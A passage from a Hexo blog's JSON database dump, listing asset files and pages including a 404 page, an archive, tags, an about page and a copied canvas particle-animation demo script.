},{"_id":"public/2017/06/27/cross-domain/20170627224652.jpg","hash":"a6896fe46db9ec5ca7ec212d4555c3a840279548","modified":1519963116293},{"_id":"public/2017/07/22/new-front-end/webpack.png","hash":"b51cb6cac28732010932320dbe4a8192d93ebddb","modified":1519963116295},{"_id":"public/css/archive.css","hash":"8db895ebaeff19ac145c961abcfd5d4a8d67a8ea","modified":1519963116303},{"_id":"public/css/signature.css","hash":"960832d176e5f72eeea417d3aca6cf43314cf6fd","modified":1519963116303},{"_id":"public/css/rocket.css","hash":"9a64eb003654226b3e8ee8a58ff06b4f502e79a0","modified":1519963116303},{"_id":"public/css/widget.css","hash":"bfb490dbb67fdfd1d1059b50ac3bb538c61c2bb9","modified":1519963116304},{"_id":"public/css/toc.css","hash":"4a892d4d00d85f984c6aeba44a34648bb98f1861","modified":1519963116306},{"_id":"public/css/highlight.css","hash":"4ab2535ed2c26f390e0d03549059e04174ef73fa","modified":1519963116306},{"_id":"public/js/hux-blog.min.js","hash":"1563e7f70550ac6b30803d6f449719b853200e35","modified":1519963116308},{"_id":"public/js/lx-blog.js","hash":"a4d43cd24d3fece6d344945f720d08dd37d7d979","modified":1519963116309},{"_id":"public/js/toc.js","hash":"41e52551731854224c249d53010c1bae5aa92ffa","modified":1519963116309},{"_id":"public/js/jquery.nav.js","hash":"ef2160a456176a4d09cc0b95d52b27dfbbadf2d8","modified":1519963116309},{"_id":"public/js/totop.js","hash":"c05360f6fc699ac12e794b1764b4a952713a3017","modified":1519963116309},{"_id":"public/js/jquery.tagcloud.js","hash":"4e5fd0b07f3bd935f2e603710447e039e3677211","modified":1519963116309},{"_id":"public/css/beantech.css","hash":"4c361354fd8e9851923fb21a620bc079380ebcd8","modified":1519963116311},{"_id":"public/css/beantech.min.css","hash":"2c66490f6b1aeafdbb32798035943142d0b6e7e5","modified":1519963116311},{"_id":"public/css/hux-blog.min.css","hash":"1baef04de262aeb7023d835429b49a805ac4ab40","modified":1519963116311},{"_id":"public/js/bootstrap.min.js","hash":"b3f2ef9f985e7906c9360756b73cd64bf7733647","modified":1519963116311},{"_id":"public/css/bootstrap.min.css","hash":"d0f687ef7e5e341fc434b067801b0e623f815a2b","modified":1519963116312},{"_id":"public/css/bootstrap.css","hash":"41c54bf695145ae0b4d9020a1da308ceb05dcaf3","modified":1519963116312},{"_id":"public/js/jquery.min.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1519963116312},{"_id":"public/js/bootstrap.js","hash":"f8752e9ae24daec0a0baffd7819122f8c6fd9103","modified":1519963116312},{"_id":"public/js/jquery.js","hash":"1852661bd11a09ca9b9cb63d1aa6ff390fffaf4e","modified":1519963116312}],"Category":[],"Data":[],"Page":[{"layout":"404","description":"你来到了没有知识的荒原 :(","header-img":"home/404.JPG","_content":"","source":"404.md","raw":"---\nlayout: 404\ndescription: \"你来到了没有知识的荒原 :(\"\nheader-img: \"home/404.JPG\"\n---\n","date":"2017-07-01T03:38:32.275Z","updated":"2017-07-01T03:38:32.275Z","path":"404.html","title":"","comments":1,"_id":"cje9esjua0000i4ucn1svjro3","content":"","site":{"data":{}},"excerpt":"","more":""},{"layout":"archive","title":"Archives","header-img":"home/IMG_2433.JPG","comments":0,"date":"2017-03-20T12:49:56.000Z","description":"Hey, this is archives","_content":"","source":"archive/index.md","raw":"---\nlayout: \"archive\"\ntitle: \"Archives\"\nheader-img: \"home/IMG_2433.JPG\"\ncomments: false\ndate: 2017-03-20 20:49:56\ndescription: \"Hey, this is archives\"\n---\n","updated":"2017-07-01T03:38:32.383Z","path":"archive/index.html","_id":"cje9esjxb002pi4uc0vxwzx3z","content":"","site":{"data":{}},"excerpt":"","more":""},{"layout":"tags","title":"Tags","description":"Hey, this is Tags.","header-img":"home/IMG_2432.JPG","_content":"","source":"tags/index.md","raw":"---\nlayout: \"tags\"\ntitle: \"Tags\"\ndescription: \"Hey, this is Tags.\"\nheader-img: \"home/IMG_2432.JPG\"\n---\n","date":"2017-07-01T03:38:32.391Z","updated":"2017-07-01T03:38:32.391Z","path":"tags/index.html","comments":1,"_id":"cje9esjxb002qi4uc7n0tmq6o","content":"","site":{"data":{}},"excerpt":"","more":""},{"layout":"about","title":"About","date":"2016-04-20T20:48:33.000Z","description":"会不会有一天，时间真的能倒退，退回你的我的回不去的悠悠的岁月","header-img":"post/IMG_2454.JPG","comments":1,"_content":"\n> 你说啥，大声点！\n","source":"about/index.md","raw":"---\nlayout: \"about\"\ntitle: \"About\"\ndate: 2016-04-21 04:48:33\ndescription: \"会不会有一天，时间真的能倒退，退回你的我的回不去的悠悠的岁月\"\nheader-img: \"post/IMG_2454.JPG\"\ncomments: true\n---\n\n> 你说啥，大声点！\n","updated":"2017-12-05T13:01:17.122Z","path":"about/index.html","_id":"cje9esjxb002ri4ucoa431cml","content":"<blockquote>\n<p>你说啥，大声点！</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>你说啥，大声点！</p>\n</blockquote>\n"},{"layout":"false","_content":"<!DOCTYPE html>\n<!-- saved from url=(0030)http://www.jq22.com/js/a7.html -->\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<title>jq22-code7</title>\n<style>\nhtml {\n  height: 100%;\n  background-image: -webkit-radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  background-image: radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  cursor: move;\n}\n\nbody {\n  width: 100%;\n  margin: 0;\n  overflow: hidden;\n}\n</style>\n</head>\n\n<body>\n\n\n<canvas id=\"canv\" width=\"1504\" height=\"418\"></canvas>\n<script>\nvar num = 300;\nvar w = window.innerWidth;\nvar h = window.innerHeight;\nvar max = 100;\nvar _x = 0;\nvar _y = 0;\nvar _z = 400;\nvar dtr = function(d) {\n  return d * Math.PI / 180;\n};\n\nvar rnd = function() {\n  return Math.sin(Math.floor(Math.random() * 360) * Math.PI / 180);\n};\nvar dist = function(p1, p2, p3) {\n  return Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2) + Math.pow(p2.z - p1.z, 2));\n};\n\nvar cam = {\n  obj: {\n    x: _x,\n    y: _y,\n    z: _z\n  },\n  dest: {\n    x: 0,\n    y: 0,\n    z: 1\n  },\n  dist: {\n    x: 0,\n    y: 0,\n    z: 200\n  },\n  ang: {\n    cplane: 0,\n    splane: 0,\n    ctheta: 0,\n    stheta: 0\n  },\n  zoom: 1,\n  disp: {\n    x: w / 2,\n    y: h / 2,\n    z: 0\n  },\n  upd: function() {\n    cam.dist.x = cam.dest.x - cam.obj.x;\n    cam.dist.y = cam.dest.y - cam.obj.y;\n    cam.dist.z = cam.dest.z - cam.obj.z;\n    cam.ang.cplane = -cam.dist.z / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.splane = cam.dist.x / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.ctheta = Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z) / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n    cam.ang.stheta = -cam.dist.y / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n  }\n};\n\nvar trans = {\n  parts: {\n    sz: function(p, sz) {\n      return {\n        x: p.x * sz.x,\n        y: p.y * sz.y,\n        z: p.z * sz.z\n      };\n    },\n    rot: {\n      x: function(p, rot) {\n        return {\n          x: p.x,\n          y: p.y * Math.cos(dtr(rot.x)) - p.z * Math.sin(dtr(rot.x)),\n          z: p.y * Math.sin(dtr(rot.x)) + p.z * Math.cos(dtr(rot.x))\n        };\n      },\n      y: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.y)) + p.z * Math.sin(dtr(rot.y)),\n          y: p.y,\n          z: -p.x * Math.sin(dtr(rot.y)) + p.z * Math.cos(dtr(rot.y))\n        };\n      },\n      z: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.z)) - p.y * Math.sin(dtr(rot.z)),\n          y: p.x * Math.sin(dtr(rot.z)) + p.y * Math.cos(dtr(rot.z)),\n          z: p.z\n        };\n      }\n    },\n    pos: function(p, pos) {\n      return {\n        x: p.x + pos.x,\n        y: p.y + pos.y,\n        z: p.z + pos.z\n      };\n    }\n  },\n  pov: {\n    plane: function(p) {\n      return {\n        x: p.x * cam.ang.cplane + p.z * cam.ang.splane,\n        y: p.y,\n        z: p.x * -cam.ang.splane + p.z * cam.ang.cplane\n      };\n    },\n    theta: function(p) {\n      return {\n        x: p.x,\n        y: p.y * cam.ang.ctheta - p.z * cam.ang.stheta,\n        z: p.y * cam.ang.stheta + p.z * cam.ang.ctheta\n      };\n    },\n    set: function(p) {\n      return {\n        x: p.x - cam.obj.x,\n        y: p.y - cam.obj.y,\n        z: p.z - cam.obj.z\n      };\n    }\n  },\n  persp: function(p) {\n    return {\n      x: p.x * cam.dist.z / p.z * cam.zoom,\n      y: p.y * cam.dist.z / p.z * cam.zoom,\n      z: p.z * cam.zoom,\n      p: cam.dist.z / p.z\n    };\n  },\n  disp: function(p, disp) {\n    return {\n      x: p.x + disp.x,\n      y: -p.y + disp.y,\n      z: p.z + disp.z,\n      p: p.p\n    };\n  },\n  steps: function(_obj_, sz, rot, pos, disp) {\n    var _args = trans.parts.sz(_obj_, sz);\n    _args = trans.parts.rot.x(_args, rot);\n    _args = trans.parts.rot.y(_args, rot);\n    _args = trans.parts.rot.z(_args, rot);\n    _args = trans.parts.pos(_args, pos);\n    _args = trans.pov.plane(_args);\n    _args = trans.pov.theta(_args);\n    _args = trans.pov.set(_args);\n    _args = trans.persp(_args);\n    _args = trans.disp(_args, disp);\n    return _args;\n  }\n};\n\n(function() {\n  \"use strict\";\n  var threeD = function(param) {\n    this.transIn = {};\n    this.transOut = {};\n    this.transIn.vtx = (param.vtx);\n    this.transIn.sz = (param.sz);\n    this.transIn.rot = (param.rot);\n    this.transIn.pos = (param.pos);\n  };\n\n  threeD.prototype.vupd = function() {\n    this.transOut = trans.steps(\n\n      this.transIn.vtx,\n      this.transIn.sz,\n      this.transIn.rot,\n      this.transIn.pos,\n      cam.disp\n    );\n  };\n\n  var Build = function() {\n    this.vel = 0.04;\n    this.lim = 360;\n    this.diff = 200;\n    this.initPos = 100;\n    this.toX = _x;\n    this.toY = _y;\n    this.go();\n  };\n\n  Build.prototype.go = function() {\n    this.canvas = document.getElementById(\"canv\");\n    this.canvas.width = window.innerWidth;\n    this.canvas.height = window.innerHeight;\n    this.$ = canv.getContext(\"2d\");\n    this.$.globalCompositeOperation = 'source-over';\n    this.varr = [];\n    this.dist = [];\n    this.calc = [];\n\n    for (var i = 0, len = num; i < len; i++) {\n      this.add();\n    }\n\n    this.rotObj = {\n      x: 0,\n      y: 0,\n      z: 0\n    };\n    this.objSz = {\n      x: w / 5,\n      y: h / 5,\n      z: w / 5\n    };\n  };\n\n  Build.prototype.add = function() {\n    this.varr.push(new threeD({\n      vtx: {\n        x: rnd(),\n        y: rnd(),\n        z: rnd()\n      },\n      sz: {\n        x: 0,\n        y: 0,\n        z: 0\n      },\n      rot: {\n        x: 20,\n        y: -20,\n        z: 0\n      },\n      pos: {\n        x: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        y: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        z: this.diff * Math.sin(360 * Math.random() * Math.PI / 180)\n      }\n    }));\n    this.calc.push({\n      x: 360 * Math.random(),\n      y: 360 * Math.random(),\n      z: 360 * Math.random()\n    });\n  };\n\n  Build.prototype.upd = function() {\n    cam.obj.x += (this.toX - cam.obj.x) * 0.05;\n    cam.obj.y += (this.toY - cam.obj.y) * 0.05;\n  };\n\n  Build.prototype.draw = function() {\n    this.$.clearRect(0, 0, this.canvas.width, this.canvas.height);\n    cam.upd();\n    this.rotObj.x += 0.1;\n    this.rotObj.y += 0.1;\n    this.rotObj.z += 0.1;\n\n    for (var i = 0; i < this.varr.length; i++) {\n      for (var val in this.calc[i]) {\n        if (this.calc[i].hasOwnProperty(val)) {\n          this.calc[i][val] += this.vel;\n          if (this.calc[i][val] > this.lim) this.calc[i][val] = 0;\n        }\n      }\n\n      this.varr[i].transIn.pos = {\n        x: this.diff * Math.cos(this.calc[i].x * Math.PI / 180),\n        y: this.diff * Math.sin(this.calc[i].y * Math.PI / 180),\n        z: this.diff * Math.sin(this.calc[i].z * Math.PI / 180)\n      };\n      this.varr[i].transIn.rot = this.rotObj;\n      this.varr[i].transIn.sz = this.objSz;\n      this.varr[i].vupd();\n      if (this.varr[i].transOut.p < 0) continue;\n      var g = this.$.createRadialGradient(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p, this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2);\n      this.$.globalCompositeOperation = 'lighter';\n      g.addColorStop(0, 'hsla(255, 255%, 255%, 1)');\n      g.addColorStop(.5, 'hsla(' + (i + 2) + ',85%, 40%,1)');\n      g.addColorStop(1, 'hsla(' + (i) + ',85%, 40%,.5)');\n      this.$.fillStyle = g;\n      this.$.beginPath();\n      this.$.arc(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2, 0, Math.PI * 2, false);\n      this.$.fill();\n      this.$.closePath();\n    }\n  };\n  Build.prototype.anim = function() {\n    window.requestAnimationFrame = (function() {\n      return window.requestAnimationFrame ||\n        function(callback, element) {\n          window.setTimeout(callback, 1000 / 60);\n        };\n    })();\n    var anim = function() {\n      this.upd();\n      this.draw();\n      window.requestAnimationFrame(anim);\n    }.bind(this);\n    window.requestAnimationFrame(anim);\n  };\n\n  Build.prototype.run = function() {\n    this.anim();\n\n    window.addEventListener('mousemove', function(e) {\n      this.toX = (e.clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('touchmove', function(e) {\n      e.preventDefault();\n      this.toX = (e.touches[0].clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.touches[0].clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('mousedown', function(e) {\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n    window.addEventListener('touchstart', function(e) {\n      e.preventDefault();\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n  };\n  var app = new Build();\n  app.run();\n})();\n/*window.addEventListener('resize', function() {\n  canvas.width = w = window.innerWidth;\n  canvas.height = h = window.innerHeight;\n}, false);*/\n</script>\n\n\n</body></html>","source":"libs/webGL/jq22-code7.html","raw":"layout: false\n---\n<!DOCTYPE html>\n<!-- saved from url=(0030)http://www.jq22.com/js/a7.html -->\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<title>jq22-code7</title>\n<style>\nhtml {\n  height: 100%;\n  background-image: -webkit-radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  background-image: radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  cursor: move;\n}\n\nbody {\n  width: 100%;\n  margin: 0;\n  overflow: hidden;\n}\n</style>\n</head>\n\n<body>\n\n\n<canvas id=\"canv\" width=\"1504\" height=\"418\"></canvas>\n<script>\nvar num = 300;\nvar w = window.innerWidth;\nvar h = window.innerHeight;\nvar max = 100;\nvar _x = 0;\nvar _y = 0;\nvar _z = 400;\nvar dtr = function(d) {\n  return d * Math.PI / 180;\n};\n\nvar rnd = function() {\n  return Math.sin(Math.floor(Math.random() * 360) * Math.PI / 180);\n};\nvar dist = function(p1, p2, p3) {\n  return Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2) + Math.pow(p2.z - p1.z, 2));\n};\n\nvar cam = {\n  obj: {\n    x: _x,\n    y: _y,\n    z: _z\n  },\n  dest: {\n    x: 0,\n    y: 0,\n    z: 1\n  },\n  dist: {\n    x: 0,\n    y: 0,\n    z: 200\n  },\n  ang: {\n    cplane: 0,\n    splane: 0,\n    ctheta: 0,\n    stheta: 0\n  },\n  zoom: 1,\n  disp: {\n    x: w / 2,\n    y: h / 2,\n    z: 0\n  },\n  upd: function() {\n    cam.dist.x = cam.dest.x - cam.obj.x;\n    cam.dist.y = cam.dest.y - cam.obj.y;\n    cam.dist.z = cam.dest.z - cam.obj.z;\n    cam.ang.cplane = -cam.dist.z / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.splane = cam.dist.x / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.ctheta = Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z) / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n    cam.ang.stheta = -cam.dist.y / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n  }\n};\n\nvar trans = {\n  parts: {\n    sz: function(p, sz) {\n      return {\n        x: p.x * sz.x,\n        y: p.y * sz.y,\n        z: p.z * sz.z\n      };\n    },\n    rot: {\n      x: function(p, rot) {\n        return {\n          x: p.x,\n          y: p.y * Math.cos(dtr(rot.x)) - p.z * Math.sin(dtr(rot.x)),\n          z: p.y * Math.sin(dtr(rot.x)) + p.z * Math.cos(dtr(rot.x))\n        };\n      },\n      y: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.y)) + p.z * Math.sin(dtr(rot.y)),\n          y: p.y,\n          z: -p.x * Math.sin(dtr(rot.y)) + p.z * Math.cos(dtr(rot.y))\n        };\n      },\n      z: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.z)) - p.y * Math.sin(dtr(rot.z)),\n          y: p.x * Math.sin(dtr(rot.z)) + p.y * Math.cos(dtr(rot.z)),\n          z: p.z\n        };\n      }\n    },\n    pos: function(p, pos) {\n      return {\n        x: p.x + pos.x,\n        y: p.y + pos.y,\n        z: p.z + pos.z\n      };\n    }\n  },\n  pov: {\n    plane: function(p) {\n      return {\n        x: p.x * cam.ang.cplane + p.z * cam.ang.splane,\n        y: p.y,\n        z: p.x * -cam.ang.splane + p.z * cam.ang.cplane\n      };\n    },\n    theta: function(p) {\n      return {\n        x: p.x,\n        y: p.y * cam.ang.ctheta - p.z * cam.ang.stheta,\n        z: p.y * cam.ang.stheta + p.z * cam.ang.ctheta\n      };\n    },\n    set: function(p) {\n      return {\n        x: p.x - cam.obj.x,\n        y: p.y - cam.obj.y,\n        z: p.z - cam.obj.z\n      };\n    }\n  },\n  persp: function(p) {\n    return {\n      x: p.x * cam.dist.z / p.z * cam.zoom,\n      y: p.y * cam.dist.z / p.z * cam.zoom,\n      z: p.z * cam.zoom,\n      p: cam.dist.z / p.z\n    };\n  },\n  disp: function(p, disp) {\n    return {\n      x: p.x + disp.x,\n      y: -p.y + disp.y,\n      z: p.z + disp.z,\n      p: p.p\n    };\n  },\n  steps: function(_obj_, sz, rot, pos, disp) {\n    var _args = trans.parts.sz(_obj_, sz);\n    _args = trans.parts.rot.x(_args, rot);\n    _args = trans.parts.rot.y(_args, rot);\n    _args = trans.parts.rot.z(_args, rot);\n    _args = trans.parts.pos(_args, pos);\n    _args = trans.pov.plane(_args);\n    _args = trans.pov.theta(_args);\n    _args = trans.pov.set(_args);\n    _args = trans.persp(_args);\n    _args = trans.disp(_args, disp);\n    return _args;\n  }\n};\n\n(function() {\n  \"use strict\";\n  var threeD = function(param) {\n    this.transIn = {};\n    this.transOut = {};\n    this.transIn.vtx = (param.vtx);\n    this.transIn.sz = (param.sz);\n    this.transIn.rot = (param.rot);\n    this.transIn.pos = (param.pos);\n  };\n\n  threeD.prototype.vupd = function() {\n    this.transOut = trans.steps(\n\n      this.transIn.vtx,\n      this.transIn.sz,\n      this.transIn.rot,\n      this.transIn.pos,\n      cam.disp\n    );\n  };\n\n  var Build = function() {\n    this.vel = 0.04;\n    this.lim = 360;\n    this.diff = 200;\n    this.initPos = 100;\n    this.toX = _x;\n    this.toY = _y;\n    this.go();\n  };\n\n  Build.prototype.go = function() {\n    this.canvas = document.getElementById(\"canv\");\n    this.canvas.width = window.innerWidth;\n    this.canvas.height = window.innerHeight;\n    this.$ = canv.getContext(\"2d\");\n    this.$.globalCompositeOperation = 'source-over';\n    this.varr = [];\n    this.dist = [];\n    this.calc = [];\n\n    for (var i = 0, len = num; i < len; i++) {\n      this.add();\n    }\n\n    this.rotObj = {\n      x: 0,\n      y: 0,\n      z: 0\n    };\n    this.objSz = {\n      x: w / 5,\n      y: h / 5,\n      z: w / 5\n    };\n  };\n\n  Build.prototype.add = function() {\n    this.varr.push(new threeD({\n      vtx: {\n        x: rnd(),\n        y: rnd(),\n        z: rnd()\n      },\n      sz: {\n        x: 0,\n        y: 0,\n        z: 0\n      },\n      rot: {\n        x: 20,\n        y: -20,\n        z: 0\n      },\n      pos: {\n        x: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        y: this.diff * Math.sin(360 * Math.random() * Math.PI / 180),\n        z: this.diff * Math.sin(360 * Math.random() * Math.PI / 180)\n      }\n    }));\n    this.calc.push({\n      x: 360 * Math.random(),\n      y: 360 * Math.random(),\n      z: 360 * Math.random()\n    });\n  };\n\n  Build.prototype.upd = function() {\n    cam.obj.x += (this.toX - cam.obj.x) * 0.05;\n    cam.obj.y += (this.toY - cam.obj.y) * 0.05;\n  };\n\n  Build.prototype.draw = function() {\n    this.$.clearRect(0, 0, this.canvas.width, this.canvas.height);\n    cam.upd();\n    this.rotObj.x += 0.1;\n    this.rotObj.y += 0.1;\n    this.rotObj.z += 0.1;\n\n    for (var i = 0; i < this.varr.length; i++) {\n      for (var val in this.calc[i]) {\n        if (this.calc[i].hasOwnProperty(val)) {\n          this.calc[i][val] += this.vel;\n          if (this.calc[i][val] > this.lim) this.calc[i][val] = 0;\n        }\n      }\n\n      this.varr[i].transIn.pos = {\n        x: this.diff * Math.cos(this.calc[i].x * Math.PI / 180),\n        y: this.diff * Math.sin(this.calc[i].y * Math.PI / 180),\n        z: this.diff * Math.sin(this.calc[i].z * Math.PI / 180)\n      };\n      this.varr[i].transIn.rot = this.rotObj;\n      this.varr[i].transIn.sz = this.objSz;\n      this.varr[i].vupd();\n      if (this.varr[i].transOut.p < 0) continue;\n      var g = this.$.createRadialGradient(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p, this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2);\n      this.$.globalCompositeOperation = 'lighter';\n      g.addColorStop(0, 'hsla(255, 255%, 255%, 1)');\n      g.addColorStop(.5, 'hsla(' + (i + 2) + ',85%, 40%,1)');\n      g.addColorStop(1, 'hsla(' + (i) + ',85%, 40%,.5)');\n      this.$.fillStyle = g;\n      this.$.beginPath();\n      this.$.arc(this.varr[i].transOut.x, this.varr[i].transOut.y, this.varr[i].transOut.p * 2, 0, Math.PI * 2, false);\n      this.$.fill();\n      this.$.closePath();\n    }\n  };\n  Build.prototype.anim = function() {\n    window.requestAnimationFrame = (function() {\n      return window.requestAnimationFrame ||\n        function(callback, element) {\n          window.setTimeout(callback, 1000 / 60);\n        };\n    })();\n    var anim = function() {\n      this.upd();\n      this.draw();\n      window.requestAnimationFrame(anim);\n    }.bind(this);\n    window.requestAnimationFrame(anim);\n  };\n\n  Build.prototype.run = function() {\n    this.anim();\n\n    window.addEventListener('mousemove', function(e) {\n      this.toX = (e.clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('touchmove', function(e) {\n      e.preventDefault();\n      this.toX = (e.touches[0].clientX - this.canvas.width / 2) * -0.8;\n      this.toY = (e.touches[0].clientY - this.canvas.height / 2) * 0.8;\n    }.bind(this));\n    window.addEventListener('mousedown', function(e) {\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n    window.addEventListener('touchstart', function(e) {\n      e.preventDefault();\n      for (var i = 0; i < 100; i++) {\n        this.add();\n      }\n    }.bind(this));\n  };\n  var app = new Build();\n  app.run();\n})();\n/*window.addEventListener('resize', function() {\n  canvas.width = w = window.innerWidth;\n  canvas.height = h = window.innerHeight;\n}, false);*/\n</script>\n\n\n</body></html>","date":"2017-07-06T08:51:38.213Z","updated":"2017-07-06T08:51:38.213Z","path":"libs/webGL/jq22-code7.html","title":"","comments":1,"_id":"cje9esjxr002si4uc4fdskg87","content":"<!DOCTYPE html>\n<!-- saved from url=(0030)http://www.jq22.com/js/a7.html -->\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<title>jq22-code7</title>\n<style>\nhtml {\n  height: 100%;\n  background-image: -webkit-radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  background-image: radial-gradient(ellipse farthest-corner at center top, #000d4d 0%, #000105 100%);\n  cursor: move;\n}\n\nbody {\n  width: 100%;\n  margin: 0;\n  overflow: hidden;\n}\n</style>\n</head>\n\n<body>\n\n\n<canvas id=\"canv\" width=\"1504\" height=\"418\"></canvas>\n<script>\nvar num = 300;\nvar w = window.innerWidth;\nvar h = window.innerHeight;\nvar max = 100;\nvar _x = 0;\nvar _y = 0;\nvar _z = 400;\nvar dtr = function(d) {\n  return d * Math.PI / 180;\n};\n\nvar rnd = function() {\n  return Math.sin(Math.floor(Math.random() * 360) * Math.PI / 180);\n};\nvar dist = function(p1, p2, p3) {\n  return Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2) + Math.pow(p2.z - p1.z, 2));\n};\n\nvar cam = {\n  obj: {\n    x: _x,\n    y: _y,\n    z: _z\n  },\n  dest: {\n    x: 0,\n    y: 0,\n    z: 1\n  },\n  dist: {\n    x: 0,\n    y: 0,\n    z: 200\n  },\n  ang: {\n    cplane: 0,\n    splane: 0,\n    ctheta: 0,\n    stheta: 0\n  },\n  zoom: 1,\n  disp: {\n    x: w / 2,\n    y: h / 2,\n    z: 0\n  },\n  upd: function() {\n    cam.dist.x = cam.dest.x - cam.obj.x;\n    cam.dist.y = cam.dest.y - cam.obj.y;\n    cam.dist.z = cam.dest.z - cam.obj.z;\n    cam.ang.cplane = -cam.dist.z / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.splane = cam.dist.x / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z);\n    cam.ang.ctheta = Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.z * cam.dist.z) / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n    cam.ang.stheta = -cam.dist.y / Math.sqrt(cam.dist.x * cam.dist.x + cam.dist.y * cam.dist.y + cam.dist.z * cam.dist.z);\n  }\n};\n\nvar trans = {\n  parts: {\n    sz: function(p, sz) {\n      return {\n        x: p.x * sz.x,\n        y: p.y * sz.y,\n        z: p.z * sz.z\n      };\n    },\n    rot: {\n      x: function(p, rot) {\n        return {\n          x: p.x,\n          y: p.y * Math.cos(dtr(rot.x)) - p.z * Math.sin(dtr(rot.x)),\n          z: p.y * Math.sin(dtr(rot.x)) + p.z * Math.cos(dtr(rot.x))\n        };\n      },\n      y: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.y)) + p.z * Math.sin(dtr(rot.y)),\n          y: p.y,\n          z: -p.x * Math.sin(dtr(rot.y)) + p.z * Math.cos(dtr(rot.y))\n        };\n      },\n      z: function(p, rot) {\n        return {\n          x: p.x * Math.cos(dtr(rot.z)) - p.y * Math.sin(dtr(rot.z)),\n          y: p.x * Math.sin(dtr(rot.z)) + p.y * Math.cos(dtr(rot.z)),\n          z: p.z\n        };\n      }\n    },\n    pos: function(p, pos) {\n      return {\n        x: p.x + pos.x,\n        y: p.y + pos.y,\n        z: p.z + pos.z\n      };\n    }\n  },\n  pov: {\n    plane: function(p) {\n      return {\n        x: p.x * cam.ang.cplane + p.z * cam.ang.splane,\n        y: p.y,\n        z: p.x * -cam.ang.splane + p.z * cam.ang.cplane\n      };\n    },\n    theta: function(p) {\n      return {\n        x: p.x,\n        y: p.y * cam.ang.ctheta - p.z * cam.ang.stheta,\n        z: p.y * cam.ang.stheta + p.z * cam.ang.ctheta\n      };\n    },\n    set: function(p) {\n      return {\n        x: p.x - cam.obj.x,\n        y: p.y - cam.obj.y,\n        z: p.z - cam.obj.z\n      };\n    }\n  },\n  persp: function(p) {\n    return {\n      x: p.x * cam.dist.z / p.z * cam.zoom,\n      y: p.y * cam.dist.z / p.z * cam.zoom,\n      z: p.z * cam.zoom,\n      p: cam.dist.z / p.z\n    };\n  },\n  disp: function(p, disp) {\n    return {\n      x: p.x + disp.x,\n      y: -p.y + disp.y,\n      z: p.z + disp.z,\n      p: p.p\n    };\n  },\n  steps: function(_obj_, sz, rot, pos, disp) {\n    var _args = trans.parts.sz(_obj_, sz);\n    _args = trans.parts.rot.x(_args, rot);\n    _args = trans.parts.rot.y(_args, rot);\n    _args = trans.parts.rot.z(_args, rot);\n    _args = trans.parts.pos(_args, pos);\n    _args = trans.pov.plane(_args);\n    _args = trans.pov.theta(_args);\n    _args = trans.pov.set(_args);\n    _args = trans.persp(_args);\n    _args = trans.disp(_args, disp);\n    return _args;\n  }\n};\n\n(function() {\n  \"use strict\";\n  var threeD = function(param) {\n    this.transIn = {};\n    this.transOut = {};\n    